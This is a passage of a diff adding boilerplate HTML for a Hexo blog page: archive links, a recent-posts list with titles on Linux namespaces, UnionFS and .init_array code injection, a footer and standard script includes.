class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/06/User-namespace/">User namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
